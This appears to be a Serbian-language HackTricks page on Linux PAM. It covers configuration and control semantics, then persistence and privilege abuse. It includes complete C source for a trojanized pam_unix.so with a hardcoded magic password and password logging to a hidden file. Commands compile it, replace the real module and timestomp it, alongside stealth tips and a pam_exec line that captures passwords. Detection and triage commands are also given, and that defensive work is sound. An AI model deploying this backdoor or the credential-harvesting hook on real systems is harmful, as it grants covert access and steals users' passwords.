# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Osnovne informacije

**PAM (Pluggable Authentication Modules)** je bezbednosni mehanizam koji **proverava identitet korisnika koji pokušavaju da pristupe računarskim uslugama** i kontroliše njihov pristup na osnovu različitih kriterijuma. Deluje poput digitalnog čuvara kapije, osiguravajući da samo ovlašćeni korisnici mogu da koriste određene usluge, a istovremeno može da ograniči njihovo korišćenje kako bi sprečio preopterećenje sistema.

#### Konfiguracione datoteke

- **Solaris** podržava zastarelu centralnu datoteku `/etc/pam.conf`, ali se u aktuelnim smernicama prednost daje datotekama za pojedinačne usluge u direktorijumu `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux sistemi** daju prednost pristupu zasnovanom na direktorijumu, pri čemu se konfiguracije za pojedinačne usluge čuvaju u direktorijumu `/etc/pam.d`. Na primer, konfiguraciona datoteka za uslugu login nalazi se na putanji `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Primer PAM konfiguracije za uslugu login može da izgleda ovako:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM domene upravljanja**

Ovi domeni, odnosno grupe za upravljanje, obuhvataju **auth**, **account**, **password** i **session**, a svaki je odgovoran za različite aspekte procesa autentifikacije i upravljanja sesijama:<sup>[[1]](#references)</sup>

- **Auth**: Potvrđuje identitet korisnika, često tako što od njega zatraži lozinku.
- **Account**: Obavlja proveru naloga i uslova kao što su članstvo u grupi ili vremenska ograničenja.
- **Password**: Upravlja promenama lozinke, uključujući proveru složenosti i sprečavanje dictionary attacks.
- **Session**: Upravlja radnjama na početku ili kraju servisne sesije, kao što su montiranje direktorijuma ili postavljanje ograničenja resursa.

#### **PAM kontrole modula**

Kontrole određuju kako modul reaguje na uspeh ili neuspeh i utiču na celokupan proces autentifikacije. Obuhvataju:<sup>[[1]](#references)</sup>

- **Required**: Neuspeh obaveznog modula na kraju dovodi do neuspeha, ali tek nakon provere svih narednih modula.
- **Requisite**: Odmah prekida proces u slučaju neuspeha.
- **Sufficient**: Ako nijedan prethodni modul `required` nije zakazao, uspeh odmah vraća rezultat i preskače preostale module u istoj grupi za upravljanje.
- **Optional**: Dovodi do neuspeha samo ako je to jedini modul u nizu.

#### Ofanzivna semantika koja je važna

Pri analizi ili izmeni PAM-a, **mesto na koje je pravilo ubačeno** određuje koji stek ga obrađuje:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` i `substack` preuzimaju pravila iz drugih datoteka, pa izmena `sshd` može uticati samo na SSH, dok izmena `system-auth`, `common-auth` ili drugog zajedničkog steka može uticati na više servisa odjednom.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM podržava i kontrole u uglastim zagradama, kao što je `[success=1 default=ignore]`. Njihova zloupotreba može **preskočiti jedan ili više modula** nakon uspešne prilagođene provere, umesto da se vidljivo zameni `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` može biti **apsolutna putanja** (`/usr/lib/security/pam_custom.so`) ili **relativna** u odnosu na podrazumevani direktorijum PAM modula. Na savremenim Linux sistemima stvarni direktorijumi su često `/lib/security`, `/lib64/security`, `/usr/lib/security` ili multiarch putanje kao što je `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Kratak savet za operatera: pre izmena uvek mapirajte **celokupan graf servisa**. Na primer, `sshd -> password-auth -> system-auth` na nekim distribucijama ili `sshd -> system-remote-login -> system-login -> system-auth` na drugim znači da isti jednolinijski implant može imati mnogo širi domet od planiranog.<sup>[[1]](#references)[[13]](#references)</sup>

Prilagođeni `auth` modul može da doda interaktivni izazov za `sudo` nakon lozinke naloga. Pre ručne provere izazova pregledajte efektivni stek `/etc/pam.d/sudo`, uključenu politiku, argumente modula i dozvole za sve povezane lokalne datoteke sa podacima. Sama čitljiva lista reči za izazov ne zaobilazi proveru lozinke niti dodaje sudoers ovlašćenje. Za privilegovani prelaz i dalje su potrebni ispravna autentifikacija naloga, uspešno dovršavanje svakog obaveznog PAM koraka i sudo pravilo koje dozvoljava izvršavanje kao root; automatizovano enumerisanje ne bi trebalo da pokrene izazov.

Za nasleđenu Ubuntu [`pam_motd` grešku u vlasništvu (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832), proverite stvarnu verziju paketa `libpam-modules` i da li servis za prijavljivanje poziva pogođeni session modul. Ubuntu je ispravio grešku u verziji **1.1.0-2ubuntu1.1** za 9.10 i **1.1.1-2ubuntu5** za 10.04 LTS; za druga izdanja ili ispravke koje su dobavljači preneli unazad potrebna je zasebna procena paketa. Prema opisanom scenariju, korisnik je morao da zameni svoj `.cache` u home direktorijumu simboličkom vezom, a zatim pokrene PAM prijavljivanje, zbog čega je stari modul promenio vlasništvo nad zaštićenom metom. Sam unos `.cache`, linija `pam_motd.so` ili stara verzija kernela ne dokazuju izloženost; tokom pasivnog enumerisanja proverite kontrolu nad home direktorijumom, efektivnu verziju modula, dostupnost prijavljivanja, obradu simboličkih veza i dozvole nad metom, bez zamene datoteka ili pokretanja prijavljivanja. Pogledajte [Ubuntu's security notice](https://ubuntu.com/security/notices/USN-959-1).

#### Primer scenarija

U postavci sa više auth modula, proces se odvija strogo određenim redosledom. Ako modul `pam_securetty` utvrdi da terminal za prijavljivanje nije ovlašćen, prijavljivanje kao root se blokira, ali se svi moduli i dalje obrađuju zbog statusa "required". Modul `pam_env` postavlja promenljive okruženja, što potencijalno poboljšava korisničko iskustvo. Moduli `pam_ldap` i `pam_unix` zajednički autentifikuju korisnika; `pam_unix` pokušava da iskoristi ranije unetu lozinku, čime se povećavaju efikasnost i fleksibilnost metoda autentifikacije.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` u servisnom steku

`pam_permit.so` uspešno završava PAM provere. Ako korisnik sa nižim privilegijama može da menja efektivnu PAM politiku nekog servisa, ubacivanje ovog modula sa kontrolnom zastavicom koja prekida stek autentifikacije može ukloniti proveru lozinke za taj servis. Za `sudo`, pre procene na koje servise ovo utiče, pregledajte `/etc/pam.d/sudo` i sve uključene datoteke `common-auth` ili `system-auth`. Zaobilaženje PAM autentifikacije **ne** dodaje novo sudoers pravilo; korisnik i dalje mora biti ovlašćen da pokrene traženu komandu. Proverite redosled pravila i eventualne ranije neuspehe modula `required` umesto da pretpostavite da jedna linija `sufficient pam_permit.so` uvek uspeva.

## Backdooring PAM – zakačivanje `pam_unix.so`

Klasičan trik za održavanje postojanosti u Linux okruženjima visoke vrednosti jeste **zamena legitimne PAM biblioteke trojanizovanim modulom za direktnu zamenu**. Na hostu čiji PAM stek učitava `pam_unix.so`, SSH ili prijavljivanje preko konzole može pozvati njegovu ulaznu tačku `pam_sm_authenticate()`; zlonamerna zamena može da prikuplja akreditive ili da implementira zaobilaženje pomoću *magic* lozinke.<sup>[[2]](#references)[[11]](#references)</sup>

### Podsetnik za kompajliranje
Skica u nastavku koristi Linux-PAM servisnu ulaznu tačku `pam_sm_authenticate()` i `pam_get_authtok()` za pristup tokenu za autentifikaciju.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Primer trojana `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

Kompajlirajte i neprimetno zamenite (obrazac zamene/timestomp dokumentuje Unit 42). Prilagodite i putanju rezervne kopije hardkodiranu u wrapper-u i komande ispod stvarnom direktorijumu PAM modula na ciljnom sistemu:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec saveti
1. **Atomsko prepisivanje** – upišite kompletnu biblioteku u privremenu datoteku, pa je preimenujte na željenu lokaciju da biste izbegli nepotpuno upisan authentication module.
2. Putanja kao što je `/usr/bin/.dbus.log` zabeležena je u analizi AuthDoor koju je sproveo Unit 42, pa je korisna i kao indikator za hunting.<sup>[[2]](#references)</sup>
3. Očuvajte entry points koje očekuje PAM stack (na primer, `pam_sm_authenticate` i `pam_sm_setcred`) kako bi ostale operacije upravljanja nastavile da rade.<sup>[[11]](#references)[[18]](#references)</sup>

### Detekcija
Za provere integriteta paketa, RPM proverava metapodatke instaliranih datoteka, `debsums -s` prijavljuje greške kontrolne sume, a `dpkg -S` u triage bloku proverava vlasništvo nad paketima; sintaksa audit watch beleži upise i promene atributa na putanji.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Uporedite MD5/SHA256 vrednosti za `pam_unix.so` sa paketom distribucije.
* Koristite `rpm -V pam` ili `debsums -s libpam-modules` da biste otkrili zamenjene biblioteke bez ručnog izračunavanja hash vrednosti.
* Proverite da li postoje dozvole za upis za sve korisnike ili neuobičajeni vlasnici u `/lib/security/`.
* Pravilo za `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Pretražite PAM konfiguracije za neočekivane module: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Ta `pam_` pretraga propušta custom module sa drugim `.so` nazivima. Pregledajte **aktivne** linije `auth`, `account`, `password` i `session` u `/etc/pam.d` (i `/etc/pam.conf` gde se koristi), uključujući njihovu control flag vrednost i svaki uključeni stack. Nepoznat modul postavljen kao `auth sufficient` pre uobičajene provere lozinke zaslužuje proveru vlasništva nad paketom i analizu binarne datoteke; [PAM-ova sintaksa za kontrolu](https://man7.org/linux/man-pages/man5/pam.d.5.html) može omogućiti da uspešna provera rano prekine taj deo stack-a. Sam naziv modula, neuobičajena vremenska oznaka ili opcija `nodelay` ne dokazuju da postoji zaobilaženje. Ako ponašanje ukazuje na timing leak, prvo pregledajte implementaciju i dostupnost servisa; rutinsko enumerisanje ne bi trebalo da ponavlja pokušaje autentifikacije.

### Brze triage komande (nakon kompromitovanja ili za threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Zloupotreba `pam_exec` za persistence
Umesto zamene `pam_unix.so`, blaži pristup je da se doda linija `pam_exec` u `/etc/pam.d/sshd`, tako da poziv koji stigne do te PAM linije pokrene pomoćni program, a da pritom normalni stek ostane neizmenjen.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` prima PAM metapodatke u promenljivama okruženja kao što su `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` i `PAM_TYPE`. Uz `expose_authtok`, pomoćni program može da pročita do `PAM_MAX_RESP_SIZE` bajtova lozinke sa `stdin` tokom faza `auth` ili `password`. Ako želite da se pomoćni program pokrene sa efektivnim UID-om umesto sa stvarnim UID-om, dodajte `seteuid`.<sup>[[4]](#references)</sup>

Praktične napomene prate tipove modula i filter `type=` dokumentovan za `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` je bolji izbor za **radnje nakon prijave**, kao što su ponovno otvaranje soketa ili pokretanje odvojenog demona.
- `auth optional pam_exec.so quiet expose_authtok ...` je uobičajen izbor za **prikupljanje akreditiva**, jer se izvršava pre otvaranja sesije.
- `type=session` ili `type=auth` mogu da se koriste za ograničavanje izvršavanja na određenu PAM fazu i izbegavanje suvišnog dvostrukog izvršavanja.

Pri proveri privilegija, apsolutna putanja do pomoćnog programa `pam_exec.so` koju trenutni korisnik može da menja predstavlja potencijalnu metu čak i kada je datoteka označena kao append-only (`a`): [atribut dozvoljava dopisivanje](https://man7.org/linux/man-pages/man1/chattr.1.html), što može biti dovoljno da se promeni kasnije ponašanje shell skripte. Najpre potvrdite da PAM servis i događaj zaista stižu do te linije, da su pomoćni program i njegova roditeljska putanja pouzdani i da se komanda izvršava pod privilegovanijim identitetom; [`seteuid` menja koji PAM UID se koristi](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Sama datoteka koja može da se menja ili rezultat komande `lsattr` ne dokazuju da se izvršavanje odvija sa privilegijama.

### Očuvanje izmena uprkos distro alatima: `authselect`

Na sistemima iz porodice RHEL i Fedora koji koriste `authselect`, direktne izmene generisanih datoteka kao što su `/etc/pam.d/system-auth` ili `/etc/pam.d/password-auth` mogu biti **prepisane pomoću `authselect`**. Da bi izmene ostale sačuvane, administratori često menjaju aktivni prilagođeni profil u `/etc/authselect/custom/<profile>/`, a zatim ga ponovo biraju.<sup>[[5]](#references)[[19]](#references)</sup>

Uobičajeni postupak kada imate root pristup:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Ovo je važno i za napad i za trijažu: ako `/etc/pam.d/system-auth` sadrži baner `Generated by authselect` i `Do not modify this file manually`, stvarna tačka postojanosti možda se nalazi u `/etc/authselect/custom/`, a ne u `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Nedavne tehnike uočene u praksi

Nedavni izveštaji iz 2025. o Linux backdoor-u **Plague** pokazali su istu osnovnu ideju u naprednijem obliku: zlonamernu PAM komponentu sa **statičkom lozinkom za zaobilaženje**, uz čišćenje SSH povezanih promenljivih okruženja i istorije shell-a (`HISTFILE=/dev/null`) kako bi se smanjili tragovi sesije nakon prijavljivanja.<sup>[[3]](#references)</sup> Ovo je koristan obrazac za potragu, jer logika backdoor-a može biti smeštena u PAM-u, dok se artefakti prikrivanja pojavljuju tek **nakon** uspešne autentifikacije.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Priručnik tajnog operativca: Infiltracija u globalne telekomunikacione mreže - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Novootkriveni PAM backdoor za Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Konfigurisanje autentifikacije korisnika pomoću authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian priručnici](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux priručnik](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian priručnici](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Upravljanje autentifikacijom u Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Vodič za autentifikaciju na nivou sistema - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Lista datoteka Ubuntu paketa: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian priručnici](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM priručnik](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Izmene/Obavezna upotreba Authselect-a - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
